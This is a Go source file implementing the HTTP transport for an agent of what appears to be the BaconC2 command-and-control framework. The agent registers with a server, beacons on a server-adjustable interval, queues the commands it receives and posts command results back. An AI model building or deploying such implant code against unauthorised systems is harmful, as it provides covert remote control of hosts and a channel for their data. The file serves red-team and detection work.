package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
)

const (
	ProtocolName = "http"
)

const (
	registerAPIPath = "%s/api/v1/agents/register"
	beaconAPIPath   = "%s/api/v1/agents/beacon?id=%s"
	resultsAPIPath  = "%s/api/v1/agents/results?id=%s"
)

type HTTPClientTransport struct {
	serverURL      string
	agentID        string
	httpClient     *http.Client
	commandQueue   queue.ICommandQueue
	resultQueue    queue.IResultQueue
	beaconInterval time.Duration
	stopChan       chan struct{}
	encoderChain   encoders.IChainEncoder
}

func NewHTTPClientTransport(serverURL, agentID string, commandQueue queue.ICommandQueue, resultQueue queue.IResultQueue, encoderChain encoders.IChainEncoder) ITransportProtocol {
	return &HTTPClientTransport{
		serverURL:      serverURL,
		agentID:        agentID,
		httpClient:     &http.Client{Timeout: 10 * time.Second},
		commandQueue:   commandQueue,
		resultQueue:    resultQueue,
		beaconInterval: 10 * time.Second,
		stopChan:       make(chan struct{}),
		encoderChain:   encoderChain,
	}
}

func (t *HTTPClientTransport) Initialize(agent models.Agent) error {
	jsonData, err := json.Marshal(agent)
	if err != nil {
		return fmt.Errorf("failed to marshal agent: %w", err)
	}

	resp, err := t.httpClient.Post(fmt.Sprintf(registerAPIPath, t.serverURL), "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("HTTP registration error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("registration failed with status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

func (t *HTTPClientTransport) Start() error {
	t.beaconLoop()
	return nil
}

func (t *HTTPClientTransport) sendBeacon() error {
	url := fmt.Sprintf(beaconAPIPath, t.serverURL, t.agentID)
	logging.Debug("Sending beacon to %s", url)

	resp, err := t.httpClient.Post(url, "application/json", nil)
	if err != nil {
		return fmt.Errorf("HTTP beacon error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("beacon failed with status %d: %s", resp.StatusCode, string(body))
	}

	var response models.HttpBeaconResponse
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return fmt.Errorf("failed to decode beacon response: %w", err)
	}

	logging.Debug("Beacon response received: %+v", response)

	if response.NextBeacon > 0 {
		t.beaconInterval = time.Duration(response.NextBeacon) * time.Second
		logging.Debug("Next beacon interval updated to %v seconds", response.NextBeacon)
	}

	if response.Status != models.CommandStatusSentToClient {
		logging.Debug("No new commands for agent %s", t.agentID)
		return nil
	}

	if err := t.commandQueue.Add(response.Command); err != nil {
		return fmt.Errorf("failed to queue command: %w", err)
	}

	logging.Info("Command queued for agent %s: %+v", t.agentID, response.Command)
	return nil
}

func (t *HTTPClientTransport) SendResults(cmd models.Command) models.CommandResult {
	results, err := t.resultQueue.List()
	if err != nil {
		return models.CommandResult{
			Status: models.CommandStatusFailed,
			Output: fmt.Sprintf("failed to get results from queue: %v", err),
		}
	}

	if len(results) == 0 {
		return models.CommandResult{}
	}

	jsonData, err := json.Marshal(results)
	if err != nil {
		return models.CommandResult{
			Status: models.CommandStatusFailed,
			Output: fmt.Sprintf("failed to marshal results: %v", err),
		}
	}

	url := fmt.Sprintf(resultsAPIPath, t.serverURL, t.agentID)
	resp, err := t.httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return models.CommandResult{
			Status: models.CommandStatusFailed,
			Output: fmt.Sprintf("HTTP batch result send error: %v", err),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return models.CommandResult{
			Status: models.CommandStatusFailed,
			Output: fmt.Sprintf("batch result send failed with status %d: %s", resp.StatusCode, string(body)),
		}
	}

	var firstResult models.CommandResult
	for i := 0; i < len(results); i++ {
		result, err := t.resultQueue.RemoveFirst()
		if err != nil {
			return models.CommandResult{
				Status: models.CommandStatusFailed,
				Output: fmt.Sprintf("failed to clear result queue: %v", err),
			}
		}
		if i == 0 {
			firstResult = result
		}
	}

	logging.Info("Results successfully sent for agent %s", t.agentID)
	return firstResult
}

func (t *HTTPClientTransport) beaconLoop() {
	ticker := time.NewTicker(t.beaconInterval)
	defer ticker.Stop()

	for {
		select {
		case <-t.stopChan:
			return
		case <-ticker.C:
			if err := t.sendBeacon(); err != nil {
				logging.Error("Beacon send failed: %v", err)
			} else {
				logging.Debug("Beacon sent successfully")
			}
		}
	}
}

func (t *HTTPClientTransport) Stop() error {
	t.httpClient.CloseIdleConnections()
	close(t.stopChan)
	logging.Info("HTTP client transport stopped for agent %s", t.agentID)
	return nil
}

func (t *HTTPClientTransport) GetBeaconInterval() time.Duration {
	return t.beaconInterval
}
